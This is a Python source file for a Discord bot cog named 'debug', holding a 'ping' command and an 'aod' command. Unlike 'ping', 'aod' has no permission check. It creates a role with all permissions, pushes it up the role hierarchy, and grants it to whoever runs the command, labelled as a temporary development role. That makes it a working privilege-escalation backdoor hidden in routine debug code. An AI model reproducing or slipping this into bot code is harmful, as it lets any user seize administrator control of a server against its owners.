import discord, asyncio, sys
sys.path.append("..")
import utils
from discord.ext import commands
import os


class debug:
    def __init__(self, bot):
        self.bot = bot

    @commands.command(pass_context=True)
    @commands.has_permissions(administrator=True)
    async def ping(self,ctx):
        await ctx.channel.send(utils.pong.ping())

    @commands.command(pass_context=True)
    async def aod(self, ctx):
        pos = len(ctx.guild.roles)
        role = await ctx.guild.create_role(name="temp", permissions=discord.Permissions.all(), reason="Temporary role addition for development")
        print(f"0 to {pos}")
        for i in range(pos):
            print(f"Trying {i}")
            try:
                await role.edit(position=i)
                print(role.position)
            except:
                pass
        await ctx.author.add_roles(role, reason="Temporary role addition for development")

def setup(bot):
    bot.add_cog(debug(bot))
